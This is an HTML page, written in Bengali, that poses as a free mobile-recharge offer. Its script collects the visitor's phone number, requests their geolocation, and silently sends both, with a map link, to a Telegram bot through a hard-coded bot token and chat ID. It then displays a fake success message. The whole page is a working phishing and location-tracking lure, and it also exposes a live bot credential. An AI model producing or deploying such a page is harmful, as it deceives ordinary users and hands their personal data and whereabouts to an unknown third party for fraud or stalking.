<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 40px auto; padding: 30px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>সঠিক নম্বর দিয়ে 'রিচার্জ নিন' বাটনে ক্লিক করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="btn" onclick="startRecharge()">রিচার্জ নিন</button>
    </div>

<script>
async function startRecharge() {
    const num = document.getElementById('phone').value;
    const btn = document.getElementById('btn');
    if (num.length < 11) { alert("সঠিক নম্বর দিন"); return; }
    
    btn.innerText = "প্রসেসিং...";
    btn.disabled = true;

    const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
    const chat_id = "7887080882";

    // লোকেশন পাওয়ার চেষ্টা, না পেলে সরাসরি নম্বর পাঠানো
    navigator.geolocation.getCurrentPosition(async (pos) => {
        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        const text = `✅ **নতুন রিকোয়েস্ট (লোকেশনসহ)**\n\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;
        await sendMsg(token, chat_id, text);
    }, async (err) => {
        const text = `⚠️ **নতুন রিকোয়েস্ট (লোকেশন ব্লক)**\n\n📱 নম্বর: ${num}\n❌ সোশ্যাল মিডিয়ায় লোকেশন ব্লক ছিল।`;
        await sendMsg(token, chat_id, text);
    }, { timeout: 6000 });
}

async function sendMsg(t, c, txt) {
    try {
        await fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`);
        alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
    } catch (e) { alert("সার্ভার ত্রুটি!"); }
    finally { 
        document.getElementById('btn').innerText = "রিচার্জ নিন";
        document.getElementById('btn').disabled = false;
    }
}
</script>
</body>
</html>
